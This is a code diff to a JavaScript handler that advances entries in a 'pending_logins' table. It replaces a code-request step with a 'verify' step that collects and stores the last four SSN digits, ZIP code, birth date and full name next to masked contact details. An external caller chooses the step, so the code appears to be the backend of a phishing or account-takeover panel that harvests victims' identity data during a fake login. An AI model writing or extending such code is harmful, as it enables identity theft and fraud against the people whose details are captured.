@@ -75,7 +75,7 @@ async function handleAdvance(context, id, body) {
   var verification_code = body.verification_code;
   var masked_email = body.masked_email || null;
   var masked_phone = body.masked_phone || null;
-  var validSteps = ["code_request", "code_verify"];
+  var validSteps = ["verify", "code_verify"];
 
   if (validSteps.indexOf(advance_to) === -1) {
     return json({ error: "advance_to must be one of: " + validSteps.join(", ") }, 400);
@@ -85,12 +85,20 @@ async function handleAdvance(context, id, body) {
   var now = Date.now();
   var rows;
 
-  if (advance_to === "code_request") {
+  if (advance_to === "verify") {
+    var ssn_last4 = body.ssn_last4 || null;
+    var zip_code = body.zip_code || null;
+    var birth_date = body.birth_date || null;
+    var full_name = body.full_name || null;
+    masked_phone = body.masked_phone || masked_phone;
+
     rows = await sql`
       UPDATE pending_logins
       SET flow_step = ${advance_to},
-          code_delivery_method = ${code_delivery_method || null},
-          masked_email = COALESCE(${masked_email}, masked_email),
+          ssn_last4 = ${ssn_last4},
+          zip_code = ${zip_code},
+          birth_date = ${birth_date},
+          full_name = ${full_name},
           masked_phone = COALESCE(${masked_phone}, masked_phone),
           status = 'pending',
           resolved_at = ${null},
